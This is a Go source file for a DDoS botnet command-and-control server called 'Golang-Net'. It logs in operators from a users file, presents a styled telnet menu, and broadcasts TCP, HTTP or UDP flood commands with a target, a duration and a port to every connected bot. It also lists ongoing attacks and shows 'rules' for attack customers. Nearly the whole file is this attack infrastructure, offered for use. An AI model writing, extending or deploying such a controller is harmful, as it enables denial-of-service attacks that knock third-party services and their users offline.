package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	USERS_FILE       = "users.txt"
	USER_SERVER_IP   = "192.168.1.34"
	USER_SERVER_PORT = "8080"
	BOT_SERVER_IP    = "192.168.1.34"
	BOT_SERVER_PORT  = "9080"
	MAXFDS           = 100
)

type UserInfo struct {
	Username string
	Password string
}

type AccInfo struct {
	Connected    bool
	Concurrents  int
	OngoingTimes []int64
}

var (
	botCount     int
	botCountLock sync.Mutex
	botConns     []*net.Conn
	ongoingAttacks []OngoingAttack
)

type OngoingAttack struct {
	Name     string
	Target   string
	Duration time.Duration
	Port     string
}

func readUsersInfo() []UserInfo {
	var users []UserInfo

	file, err := os.Open(USERS_FILE)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return users
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			users = append(users, UserInfo{Username: strings.TrimSpace(parts[0]), Password: strings.TrimSpace(parts[1])})
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}

	return users
}

func handleUserConnection(conn net.Conn, users []UserInfo, accinfo []AccInfo) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)

	for {
		conn.Write([]byte("\033[2J\033[3J")) // Clear screen and scrollback buffer

		// Application title and prompt
		conn.Write([]byte("\033[0m\033[2J\033[3J")) // Clear screen
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r                         \033[38;5;109mAuth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion -- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\n"))
		conn.Write([]byte("\033[0m\r                         Username\033[38;5;62m: \033[48;5;255m\033[38;5;0m"))
		scanner.Scan()
		username := strings.TrimSpace(scanner.Text())

		// Password prompt
		conn.Write([]byte("\033[0m\r                         Password\033[38;5;62m: \033[48;5;255m\033[38;5;0m"))
		scanner.Scan()
		password := strings.TrimSpace(scanner.Text())


		if !authenticate(users, username, password) {
			conn.Write([]byte("Invalid username or password.\n"))
			continue
		}

		// Update AccInfo
		for i, acc := range accinfo {
			if !acc.Connected {
				accinfo[i].Connected = true
				break
			}
		}
		conn.Write([]byte("\033[2J\033[3J")) // Clear screen and scrollback buffer
		conn.Write([]byte("\033[0m\033[2J\033[3J")) // Clear screen
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\033[0m\r                             \033[38;5;15m\033[38;5;118mAuthentication Successful\n"))
		conn.Write([]byte(fmt.Sprintf("\033[0m\r                               \033[38;5;15mWelcome User [ %s ] \n", username)))
		conn.Write([]byte("\r                  \x1B[38;5;60m    ╔═─────\033[38;5;62m──\033[38;5;67m───\033[38;5;69m───\033[38;5;73m────\033[38;5;69m────\033[38;5;67m─────\033[38;5;62m─────\033[38;5;60m────═╗\n\r"))
		conn.Write([]byte("\r                      \033[38;5;242m│\033[38;5;15m       Welcome To Golang-Net         \033[38;5;242m│\r\n"))
		conn.Write([]byte("\r                  \x1B[38;5;60m    ╚═─────\033[38;5;62m──\033[38;5;67m───\033[38;5;69m───\033[38;5;73m────\033[38;5;69m────\033[38;5;67m─────\033[38;5;62m─────\033[38;5;60m────═╝\n\r"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		conn.Write([]byte("\r\n"))
		// Main user interaction loop
		for {
			conn.Write([]byte("\r                \x1B[38;5;60m╔═─────\033[38;5;62m───────\033[38;5;67m────\033[38;5;73m──═╗\033[38;5;15m  Menu \033[38;5;73m╔═──\033[38;5;69m──────\033[38;5;67m────\033[38;5;62m────\033[38;5;60m──═╗\n"))
			conn.Write([]byte("\r                \033[38;5;242m║                           \033[38;5;242m                      ║\n"))
			conn.Write([]byte("\r                \033[38;5;242m║            \033[38;5;67m[\033[38;5;15m1\033[38;5;67m] \033[38;5;15mView connected bots             \033[38;5;242m ║\n"))
			conn.Write([]byte("\r                \033[38;5;242m│            \033[38;5;67m[\033[38;5;15m2\033[38;5;67m] \033[38;5;15mView Rules                      \033[38;5;242m │\n"))
			conn.Write([]byte("\r                \033[38;5;242m│            \033[38;5;67m[\033[38;5;15m3\033[38;5;67m] \033[38;5;15mSend command to bots            \033[38;5;242m │\n"))
			conn.Write([]byte("\r                \033[38;5;242m│            \033[38;5;67m[\033[38;5;15m4\033[38;5;67m] \033[38;5;15mOngoing                         \033[38;5;242m │\n"))
			conn.Write([]byte("\r                \033[38;5;242m║            \033[38;5;67m[\033[38;5;15m5\033[38;5;67m] \033[38;5;15mLogout                          \033[38;5;242m ║\n"))
			conn.Write([]byte("\r                \033[38;5;242m║                           \033[38;5;242m                      ║\n"))
			conn.Write([]byte("\r                \x1B[38;5;60m╚═─────\033[38;5;62m───────\033[38;5;67m────\033[38;5;73m──────────────\033[38;5;69m──────\033[38;5;67m────\033[38;5;62m────\033[38;5;60m───═╝\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\r                \033[38;5;15m$ \033[38;5;60mEn\033[38;5;61mte\033[38;5;62mr\033[38;5;63m ch\033[38;5;67moic\033[38;5;73me\033[38;5;73m:\033[0m "))

			// Move cursor to the specified line (assuming row 15, column 1)
			
			scanner.Scan()
			choice := strings.TrimSpace(scanner.Text())

			switch choice {
			case "1":
				conn.Write([]byte(fmt.Sprintf("\r                \033[38;5;67m[\033[38;5;15m Currently connected bots \033[38;5;73m: \033[38;5;15m%d \033[38;5;67m]\n   ", getBotCount())))
			case "2":
				DisplayRules(conn)
			case "3":
				sendCommandToBots(conn)
			case "4":
				displayOngoingAttacks(conn)
			case "5":
				conn.Write([]byte("                Logged Out Successfully.\n"))
				return
			default:
				conn.Write([]byte("                Invalid Choice. Please Try Again.\n"))
			}
		}
	}
}

func DisplayRules(conn net.Conn) {
	// Clear screen and scrollback buffer
conn.Write([]byte("\033[2J\033[3J"))
conn.Write([]byte("\033[0m\033[2J\033[3J")) // Clear screen
	conn.Write([]byte("\r                \033[38;5;60m╔═─────\033[38;5;62m───────\033[38;5;67m────\033[38;5;73m──────────────\033[38;5;69m──────\033[38;5;67m────\033[38;5;62m────\033[38;5;60m───═╗\n"))
	conn.Write([]byte("\r                \033[38;5;242m║                           \033[38;5;242m                      ║\n"))
	conn.Write([]byte("\r                \033[38;5;242m║  \033[38;5;67m[\033[38;5;15m1\033[38;5;67m] \033[38;5;15mBe Kind No Hospitals Or .Gov Or Agencies\033[38;5;242m   ║\n"))
	conn.Write([]byte("\r                \033[38;5;242m│  \033[38;5;67m[\033[38;5;15m2\033[38;5;67m] \033[38;5;15mTime Is In Seconds And Methods Are In Caps\033[38;5;242m │\n"))
	conn.Write([]byte("\r                \033[38;5;242m│  \033[38;5;67m[\033[38;5;15m3\033[38;5;67m] \033[38;5;15mNo Spamming Multiple Methods.             \033[38;5;242m │\n"))
	conn.Write([]byte("\r                \033[38;5;242m║  \033[38;5;67m[\033[38;5;15m4\033[38;5;67m] \033[38;5;15mFollow The Guidelines Strictly.           \033[38;5;242m ║\n"))
	conn.Write([]byte("\r                \033[38;5;242m║                           \033[38;5;242m                      ║\n"))
	conn.Write([]byte("\r                \033[38;5;60m╚═─────\033[38;5;62m───────\033[38;5;67m────\033[38;5;73m──────────────\033[38;5;69m──────\033[38;5;67m────\033[38;5;62m────\033[38;5;60m───═╝\n"))
	conn.Write([]byte("\r\n"))
}

func authenticate(users []UserInfo, username, password string) bool {
	for _, user := range users {
		if user.Username == username && user.Password == password {
			return true
		}
	}
	return false
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return botCount
}

func incrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	botCount++
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	botCount--
}

func handleBotConnection(conn net.Conn) {
	defer conn.Close()

	incrementBotCount()
	defer decrementBotCount()

	// Handle bot commands here
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		// Process incoming data from the bot
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error Reading From Bot:", err)
	}
}

func sendCommandToBots(conn net.Conn) {
    scanner := bufio.NewScanner(conn)

    // Prompt for command selection
    conn.Write([]byte("\r\n                \033[38;5;67m[ \033[38;5;15mTCP\033[38;5;73m | \033[38;5;15mHTTP\033[38;5;73m | \033[38;5;15mUDP\033[38;5;73m | \033[38;5;15mSTOP\033[38;5;67m] \033[38;5;15m+ \033[38;5;67m[\033[38;5;15mcancel\033[38;5;67m]\033[38;5;73m\033[38;5;15m: "))
    scanner.Scan()
    method := strings.TrimSpace(scanner.Text())

    if method == "cancel" || method == "Cancel"{
        conn.Write([]byte("\r\n                \033[38;5;67m[\033[38;5;15m Operation cancelled. \033[38;5;67m]\n"))
        return
    }

    if method == "STOP" || method == "stop"{
        sendToBots("STOP")
        conn.Write([]byte("\r\n                STOP command sent to bots.\n"))
        return
    }

    // Prompt for IP/domain
    conn.Write([]byte("\r\n                \033[38;5;67m[ \033[38;5;15mIP\033[38;5;73m | \033[38;5;15mDomain \033[38;5;67m]\033[38;5;15m + \033[38;5;67m[\033[38;5;15mCancel\033[38;5;67m]\033[38;5;73m\033[38;5;15m: "))
    scanner.Scan()
    ipURL := strings.TrimSpace(scanner.Text())

    if ipURL == "cancel" || ipURL == "Cancel" {
        conn.Write([]byte("\r                \033[38;5;67m[\033[38;5;15m Operation cancelled. \033[38;5;67m]\n"))
        return
    }

    // Prompt for duration
    conn.Write([]byte("\r\n                \033[38;5;67m[ \033[38;5;15mDuration (Sec's) \033[38;5;67m]\033[38;5;15m + \033[38;5;67m[\033[38;5;15mCancel\033[38;5;67m]\033[38;5;73m\033[38;5;15m: "))
    scanner.Scan()
    durationStr := strings.TrimSpace(scanner.Text())

    if durationStr == "cancel" || durationStr == "Cancel"{
        conn.Write([]byte("\r                \033[38;5;67m[\033[38;5;15m Operation cancelled. \033[38;5;67m]\n"))
        return
    }

    // Prompt for port
    conn.Write([]byte("\r\n                \033[38;5;67m[ \033[38;5;141mMust Be Given a Port To Work\033[38;5;67m]\n"))
    conn.Write([]byte("\r                \033[38;5;67m[ \033[38;5;15mPort \033[38;5;67m] \033[38;5;15m + \033[38;5;67m[\033[38;5;15mCancel\033[38;5;67m]\033[38;5;73m\033[38;5;15m: "))
    scanner.Scan()
    portNumber := strings.TrimSpace(scanner.Text())

    if portNumber == "cancel" || portNumber == "Cancel"{
        conn.Write([]byte("\r                \033[38;5;67m[\033[38;5;15m Operation Cancelled. \033[38;5;67m]\n"))
        return
    }

    // Validate required inputs
    if method == "" || ipURL == "" || durationStr == "" || portNumber == "" {
        conn.Write([]byte("\r                \033[38;5;67m[\033[38;5;15m Missing Required Inputs. Operation Cancelled.\033[38;5;67m]\n"))
        return
    }

    // Construct the command
    command := fmt.Sprintf("%s %s %s %s", method, ipURL, durationStr, portNumber)
    // Send the command to bots
    sendToBots(command)
    conn.Write([]byte("\r\n                \033[38;5;67m[\033[38;5;15m Command Sent Successfully To Bots.\033[38;5;67m]\n"))
}

func sendToBots(command string) {
	for _, botConn := range botConns {
		_, err := (*botConn).Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println("Error Sending Command To Cot:", err)
		}
	}
}


func displayOngoingAttacks(conn net.Conn) {
	if len(ongoingAttacks) == 0 {
		conn.Write([]byte("\rNo ongoing attacks.\r\n"))
		return
	}

	conn.Write([]byte("\rOngoing Attacks:\r\n"))
	for i, attack := range ongoingAttacks {
		conn.Write([]byte(fmt.Sprintf("\rAttack %d:\r\n", i+1)))
		conn.Write([]byte(fmt.Sprintf("\rName: %s\r\n", attack.Name)))
		conn.Write([]byte(fmt.Sprintf("\rTarget: %s\r\n", attack.Target)))
		conn.Write([]byte(fmt.Sprintf("\rDuration: %s\r\n", attack.Duration.String())))
		conn.Write([]byte(fmt.Sprintf("\rPort: %s\r\n", attack.Port)))
		conn.Write([]byte("\r\n")) // Add spacing between attacks
	}
}


func main() {
	users := readUsersInfo()
	accinfo := make([]AccInfo, MAXFDS)

	fmt.Println("User Server Started On", USER_SERVER_IP+":"+USER_SERVER_PORT)
	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
	if err != nil {
		fmt.Println("Error Atarting User Server:", err)
		return
	}
	defer userListener.Close()

	fmt.Println("Bot Server Started On", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
	botListener, err := net.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
	if err != nil {
		fmt.Println("Error Starting Bot Server:", err)
		return
	}
	defer botListener.Close()

	go func() {
		for {
			conn, err := userListener.Accept()
			
			if err != nil {
				fmt.Println("Error Cccepting User Connection:", err)
				continue
			}
			fmt.Println("Accepting User Connection:", conn.RemoteAddr())
			go handleUserConnection(conn, users, accinfo)
		}
	}()

	for {
		conn, err := botListener.Accept()
		if err != nil {
			fmt.Println("Error Accepting Bot Connection:", err)
			continue
		}
		fmt.Println("Accepting Bot Connection:", conn.RemoteAddr())
		botConns = append(botConns, &conn)
		go handleBotConnection(conn)
	}
}
